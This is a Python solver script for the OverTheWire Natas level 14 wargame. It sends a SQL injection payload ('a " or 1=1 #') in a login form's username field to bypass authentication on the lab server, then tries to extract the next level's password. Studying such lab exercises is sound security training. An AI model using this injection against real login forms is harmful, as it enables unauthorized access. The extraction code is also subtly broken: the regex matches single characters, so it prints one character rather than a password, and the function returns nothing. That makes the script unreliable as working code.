import re
import requests
from requests.auth import HTTPBasicAuth
import natas13solution

auth = HTTPBasicAuth('natas14', natas13solution.get_pass())
def get_pass():
    dat = {'username':'a " or 1=1 #','password':'','submit':'Login'}
    r = requests.post('http://natas14.natas.labs.overthewire.org/', auth=auth,data=dat)
    pass_regex = '[a-zA-Z0-9]'
    print(re.findall(pass_regex,r.text)[1])
if __name__ == "__main__":
    get_pass()
